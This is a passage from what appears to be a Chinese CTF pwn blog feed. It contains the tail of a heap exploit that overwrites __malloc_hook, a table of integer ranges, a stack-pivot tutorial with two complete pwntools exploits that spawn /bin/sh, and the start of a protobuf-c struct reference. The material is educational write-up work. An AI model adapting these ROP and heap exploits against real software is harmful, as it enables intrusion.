class="string">&#x27;please enter idx:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;please enter idx:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&#x27;your content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">free() <span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">libc_leak = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;libc_leak&#x27;</span>,libc_leak)</span><br><span class="line"></span><br><span class="line">libc_base = libc_leak - <span class="number">0x3ebca0</span> <span class="comment">#0x3ebca0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">one_gadget = [<span class="number">0x4f29e</span>,<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">gadget = libc_base + <span class="number">0x10a2fc</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(gadget)*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/write-up/">write up</category>
      
      
      
      <comments>http://example.com/2024/05/13/H-NCTF-2024-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>整数类型取值范围</title>
      <link>http://example.com/2024/04/26/%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4/</link>
      <guid>http://example.com/2024/04/26/%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4/</guid>
      <pubDate>Fri, 26 Apr 2024 14:57:03 GMT</pubDate>
      
      <description>&lt;p&gt;用于整数溢出&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>用于整数溢出</p><span id="more"></span><table><thead><tr><th>type</th><th>min</th><th>max</th><th>hex</th></tr></thead><tbody><tr><td>int</td><td>-2147483648</td><td>2147483647 (2^31 - 1)</td><td>0x7FFFFFFF</td></tr><tr><td>unsigned int</td><td>0</td><td>4294967295 (2^32 - 1)</td><td>0xFFFFFFFF</td></tr><tr><td>long</td><td>-2147483648</td><td>2147483647 (2^31 - 1)</td><td>0x7FFFFFFF</td></tr><tr><td>unsigned long</td><td>0</td><td>4294967295 (2^32 - 1)</td><td>0xFFFFFFFF</td></tr><tr><td>long long</td><td>-9223372036854775808</td><td>9223372036854775807 (2^63 - 1)</td><td>0x7FFFFFFFFFFFFFFF</td></tr><tr><td>unsigned long long</td><td>0</td><td>18446744073709551615 (2^64 - 1)</td><td>0xFFFFFFFFFFFFFFFF</td></tr><tr><td>__int8</td><td>-128</td><td>127</td><td>0x7F</td></tr><tr><td>unsigned __int8</td><td>0</td><td>255</td><td>0xFF</td></tr><tr><td>__int16</td><td>-32768</td><td>32767</td><td>0x7FFF</td></tr><tr><td>unsigned __int16</td><td>0</td><td>65535</td><td>0xFFFF</td></tr><tr><td>__int32</td><td>-2147483648</td><td>2147483647</td><td>0x7FFFFFFF</td></tr><tr><td>unsigned __int32</td><td>0</td><td>4294967295</td><td>0xFFFFFFFF</td></tr><tr><td>__int64</td><td>-9223372036854775808</td><td>9223372036854775807 (2^63 - 1)</td><td>0x7FFFFFFFFFFFFFFF</td></tr><tr><td>unsigned __int64</td><td>0</td><td>18446744073709551615 (2^64 - 1)</td><td>0xFFFFFFFFFFFFFFFF</td></tr></tbody></table>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      
      <comments>http://example.com/2024/04/26/%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>栈迁移</title>
      <link>http://example.com/2024/03/27/%E6%A0%88%E8%BF%81%E7%A7%BB/</link>
      <guid>http://example.com/2024/03/27/%E6%A0%88%E8%BF%81%E7%A7%BB/</guid>
      <pubDate>Wed, 27 Mar 2024 04:37:01 GMT</pubDate>
      
      <description>&lt;p&gt;躺着躺着突然悟到了栈迁移的真谛，这种感觉谁懂？！&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>躺着躺着突然悟到了栈迁移的真谛，这种感觉谁懂？！</p><span id="more"></span><h4 id="leave-ret"><a href="#leave-ret" class="headerlink" title="leave ret"></a>leave ret</h4><p>这点非常非常非常重要，能不能理解栈迁移，靠的就是这个。</p><p>这里用x86_64位的寄存器当例子 (这里要注意，pop指令是将rsp的内容弹出并赋给相应寄存器，且 rsp + 8)</p><p>leave  相当于  mov rsp rbp;pop rbp </p><p>ret      相当于  pop rip</p><p>每个函数返回时都会执行该操作，如</p><p><img src="/imgs/$%7Bfiilename%7D/%E6%A0%88%E8%BF%81%E7%A7%BB-1.png"></p><p>其实这个操作就相当于恢复调用该函数的函数的栈空间</p><p>下面利用2个例子来理解其如何使用</p><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><h5 id="HDCTF-2023-KEEP-ON"><a href="#HDCTF-2023-KEEP-ON" class="headerlink" title="[HDCTF 2023]KEEP ON"></a>[HDCTF 2023]KEEP ON</h5><p>该题利用fmt漏洞泄露rbp的内容，也就是栈地址，再利用栈迁移来实现漏洞利用</p><p><img src="/imgs/$%7Bfiilename%7D/%E6%A0%88%E8%BF%81%E7%A7%BB-2.png"></p><p>首先rbp的偏移是16，发送%16$p即可，fmt漏洞这里就不过多解释</p><p>我们来看rbp里存的是什么</p><p>rbp里存的是main函数的栈底地址0x7ffda23e22a0</p><p>0x7ffda23e22a0 - 0x60 就是我们read函数读入的地址，也就是s的地址，我们在这里构造gadget</p><p><img src="/imgs/$%7Bfiilename%7D/%E6%A0%88%E8%BF%81%E7%A7%BB-3.png"></p><p>接下来第二个read我们构造了下面的pd</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gadget = old_rbp - <span class="number">0x60</span></span><br><span class="line">pd = p64(pop_rdi) + p64(gadget + <span class="number">0x18</span>) + p64(system) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">pd = pd.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>) + p64(gadget - <span class="number">0x8</span>) + p64((leave_ret))</span><br></pre></td></tr></table></figure><p>我们先理解后半段pd，在read后函数返回</p><p>第一次leave ret</p><p>mov rsp rbp;pop rbp 把 rsp 迁移到 rbp 的地址，然后把 rbp 的内容赋给 rbp，这里 rbp 的内容被我们覆盖成了 gadget - 0x8 所以此时 rbp 就迁到了 0x7ffda23e2238</p><p>pop rip  把 leave_ret 赋给 rip 进行第二次 leave ret</p><p>第二次 leave ret </p><p>mov rsp rbp;pop rbp 同上，此时rsp 迁到了 0x7ffda23e2238 ，这时候 rbp 会迁到0x4007ed (此时的rbp不需要管他) ，因为已经用不到了</p><p>pop rip 把 pop_rdi 的地址赋值给rip ，成功的劫持了 rip 到我们的 gadget 上，执行我们的rop</p><p>前面说过pop时rsp会+8，这也是为什么我们要把 rbp 的内容覆盖成 gadget - 0x8 的原因</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/hdctf&quot;</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;./hdctf&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc.so.6&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc.so.6&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   p.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   p.recvuntil(a, drop=<span class="literal">True</span>)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   p.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   p.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    leave_ret = <span class="number">0x4007F2</span></span><br><span class="line">    pop_rdi = <span class="number">0x4008D3</span></span><br><span class="line">    system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    sa(<span class="string">&#x27;please show me your name: \n&#x27;</span>,<span class="string">b&#x27;%16$p&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;hello,&#x27;</span>)</span><br><span class="line">    old_rbp  = <span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    lg(<span class="string">&#x27;old_rbp&#x27;</span>,old_rbp)</span><br><span class="line"></span><br><span class="line">    gadget = old_rbp - <span class="number">0x60</span></span><br><span class="line">    pd = p64(pop_rdi) + p64(gadget + <span class="number">0x18</span>) + p64(system) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    pd = pd.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>) + p64(gadget - <span class="number">0x8</span>) + p64((leave_ret))</span><br><span class="line">    sa(<span class="string">b&#x27;keep on !&#x27;</span>,pd)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    </span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h5 id="just-read"><a href="#just-read" class="headerlink" title="just_read"></a>just_read</h5><p>这题是2023重庆市大学生信息安全竞赛的题目，只溢出了0x10给你修改rbp和返回地址</p><p><img src="/imgs/$%7Bfiilename%7D/%E6%A0%88%E8%BF%81%E7%A7%BB-4.png"></p><p>第一次构造的pd</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(<span class="number">0x400675</span>)</span><br></pre></td></tr></table></figure><p>经过上一个例题初步理解了栈迁移后，下面的会有所省略</p><p>该pd将 rbp 迁移到了 bss+0x40 ，并重新返回 vuln 函数进行第二次read ,这里的0x400675并不是vuln最开头的地址，原因是每次函数调用时都会push rbp;mov rbp,rsp</p><p>bss + 0x40 是因为我们read的地址是 rbp - 0x40，所以第二次read是写在bss的地址，也就是我们gadget的地址</p><p>第二次构造的pd</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pd=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">pd+=p64(pop_rbp)+p64(bss+<span class="number">0x500</span>)+p64(<span class="number">0x400675</span>)</span><br><span class="line">pd=pd.ljust(<span class="number">0x40</span>,<span class="string">&quot;\x00&quot;</span>)+p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br></pre></td></tr></table></figure><p>第一次leave ret : 此时rbp迁移到了bss - 0x8 ，rsp 迁移到了 bss+0x40</p><p>第二次leave ret : 此时rbp迁移到了bss - 0x8所存的地址上，具体是哪不用理会，rsp迁移到了bss - 0x8，经过两次pop后，rip成功的执行到了我们的rop</p><p>rop泄露了puts的地址，由此计算libc_base，可以得到system和’&#x2F;bin&#x2F;sh’，并把rbp迁移到bss+0x500，再次返回0x400675进行第三次read</p><p>第三次构造的pd</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pd=p64(pop_rdi)+p64(bin_sh_addr)+p64(libc_system)</span><br><span class="line">pd=pd.ljust(<span class="number">0x40</span>,<span class="string">&quot;\x00&quot;</span>)+p64(bss+<span class="number">0x500</span>-<span class="number">0x40</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br></pre></td></tr></table></figure><p>如果前面都理解了的话，到这里就通俗易懂啦</p><p>第一次leave ret : 此时rbp迁移到了bss+0x500-0x40-0x8 ，rsp 迁移到了 bss+0x500</p><p>第二次leave ret : 此时rbp又不知道去哪了，不用管，rsp迁移到了bss+0x500-0x40-0x8 ，经过两次pop执行了我们的rop</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc.so.6&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   p.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   p.recvuntil(a, drop=<span class="literal">True</span>)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   p.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   p.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    </span><br><span class="line">    puts_plt=elf.plt.puts</span><br><span class="line">    puts_got=elf.got.puts</span><br><span class="line">    </span><br><span class="line">    pop_rdi = <span class="number">0x400723</span></span><br><span class="line">    leave_ret = <span class="number">0x400691</span></span><br><span class="line">    bss = <span class="number">0x601200</span></span><br><span class="line">    pop_rbp = <span class="number">0x400578</span></span><br><span class="line">    </span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(<span class="number">0x400675</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;just read!&#x27;</span>,pd)</span><br><span class="line">    </span><br><span class="line">    pd=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">    pd+=p64(pop_rbp)+p64(bss+<span class="number">0x500</span>)+p64(<span class="number">0x400675</span>)</span><br><span class="line">    pd=pd.ljust(<span class="number">0x40</span>,<span class="string">&quot;\x00&quot;</span>)+p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">    s(pd)</span><br><span class="line">    </span><br><span class="line">    ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    libc_base = u64(r(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)-libc.symbols[<span class="string">b&#x27;puts&#x27;</span>]</span><br><span class="line">    libc_system = libc_base + libc.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    pd=p64(pop_rdi)+p64(bin_sh_addr)+p64(libc_system)</span><br><span class="line">    pd=pd.ljust(<span class="number">0x40</span>,<span class="string">&quot;\x00&quot;</span>)+p64(bss+<span class="number">0x500</span>-<span class="number">0x40</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">    </span><br><span class="line">    s(pd)</span><br><span class="line">    </span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      <category domain="http://example.com/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</category>
      
      
      <comments>http://example.com/2024/03/27/%E6%A0%88%E8%BF%81%E7%A7%BB/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>protobuf-c的序列化</title>
      <link>http://example.com/2024/03/20/protobuf-c%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96/</link>
      <guid>http://example.com/2024/03/20/protobuf-c%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
      <pubDate>Wed, 20 Mar 2024 12:04:30 GMT</pubDate>
      
      <description>&lt;p&gt;在复现ciscn 2023 线上初赛 pwn题目 StrangeTalkBot 中接触到了protobuf-c的序列化，记录一下！&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在复现ciscn 2023 线上初赛 pwn题目 StrangeTalkBot 中接触到了protobuf-c的序列化，记录一下！</p><span id="more"></span><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://protobuf.dev/programming-guides/proto2/">Language Guide (proto 2) | Protocol Buffers Documentation (protobuf.dev)</a></p><p><a href="https://github.com/protobuf-c/protobuf-c/tree/master/protobuf-c">protobuf-c&#x2F;protobuf-c at master · protobuf-c&#x2F;protobuf-c · GitHub</a></p><h5 id="关于字段注册结构体"><a href="#关于字段注册结构体" class="headerlink" title="关于字段注册结构体"></a>关于字段注册结构体</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line"><span class="type">uint32_t</span>id;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">ProtobufCLabellabel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The type of the field. */</span></span><br><span class="line">ProtobufCTypetype;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment"> * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment"> * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span>quantifier_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment"> * itself.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span>offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A type-specific descriptor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment"> * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment"> * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span>*descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span>*default_value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment"> * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">uint32_t</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">unsigned</span>reserved_flags;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line"><span class="comment">/** A well-formed message must have exactly one of this field. */</span></span><br><span class="line">PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A well-formed message can have zero or one of this field (but not</span></span><br><span class="line"><span class="comment"> * more than one).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This field can be repeated any number of times (including zero) in a</span></span><br><span class="line"><span class="comment"> * well-formed message. The order of the repeated values will be</span></span><br><span class="line"><span class="comment"> * preserved.</span></span><br><span 